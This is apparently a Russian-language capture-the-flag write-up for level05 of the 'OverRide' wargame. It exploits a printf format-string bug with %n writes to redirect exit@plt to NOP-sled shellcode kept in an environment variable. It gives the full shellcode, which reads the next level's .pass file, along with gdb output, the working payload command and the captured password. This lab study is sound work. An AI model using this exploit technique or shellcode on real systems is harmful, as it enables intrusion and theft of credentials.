Считываем из консоли, меняя зашлавные строчки на строчные выводим это в printf

используем уязвимость printf и спецификатора %n

запишем и сохраним шелкод в переменные окружения 
причем шелкод сразу будет считывать .pass

"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"

но адрес переменной окружения все время меняется, поэтому добавим перед этим дорожку nop
export SC=`python -c 'print("\x90" * 100000 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass" )'`

найдем адрес переменой окружения:
    (gdb) x/1000s $esp

    0xfffe57f5:	
    0xfffe58bd:	 "\220\220\220\220\220\220\

    
будем перезаписывать адрес возврата exit = 0x80497e0
    0x08048370  exit@plt
    (gdb) disas 0x08048370
    Dump of assembler code for function exit@plt:
    => 0x08048370 <+0>:     jmp    *0x80497e0
    0x08048376 <+6>:     push   $0x18
    0x0804837b <+11>:    jmp    0x8048330


узнаем каким аргументов в стеке будет храниться наша сохранемая строчка 
    level05@OverRide:~$ ./level05
    aaaa%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
    aaaa0x640xf7fcfac00xf7ec3af90xfffe4fbf0xfffe4fbe(nil)0xffffffff0xfffe50440xf7fdb0000x616161610x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x804000a0xffffffff0xf7e5ed560xf7fceff40xf7e5ede50xf7feb620
    т.е. 10ым

перезаписывать будем по байтам, причем отступим от переменной окружения например на 0xff063d3e

16 + 209 = 225 = 0xff
225  +  231 (mod 225 ) = 0x6
55+6 = 61 = 0x3d
61 + 1 = 0x3e

python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe1'[::-1] + '\x08\x04\x97\xe2'[::-1] +  '\x08\x04\x97\xe3'[::-1]+'%0209x%10\$n' + '%0231x%11\$n' + '%055x%12\$n' + '%13\$n'" | ./level05

level05@OverRide:~$ python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe1'[::-1] + '\x08\x04\x97\xe2'[::-1] +  '\x08\x04\x97\xe3'[::-1]+'%0209x%10\$n' + '%0231x%11\$n' + '%055x%12\$n' + '%13\$n'" | ./level05
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f7fcfac000000000000000000000000000000000000000000000000f7ec3af9
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
level05@OverRide:~$